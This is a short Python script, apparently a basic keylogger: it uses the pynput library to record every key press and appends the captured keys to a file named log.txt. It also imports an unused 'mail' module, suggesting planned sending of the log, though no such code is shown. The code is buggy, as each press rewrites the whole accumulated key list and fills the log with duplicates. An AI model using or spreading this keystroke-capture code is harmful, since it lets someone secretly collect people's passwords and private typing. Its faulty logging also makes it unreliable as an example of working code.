import mail
import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    try:
        # Check if the pressed key has a printable representation (alphanumeric)
        if key.char is not None:
            keys.append(key.char)
        else:
            # If it's a special key (e.g., Shift, Ctrl), just append the key's name
            keys.append(str(key))
    except AttributeError:
        # If the key doesn't have a char attribute, it's a special key
        keys.append(str(key))

    write_file(keys)

def write_file(keys):
    with open('log.txt', 'a') as f:  # Use 'a' to append to the file
        for key in keys:
            #  directly write the key to the file
            f.write(key)
        # Add a newline character after each set of keys for better readability
        f.write('\n')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop the listener
        return False

# Create a listener instance and start listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
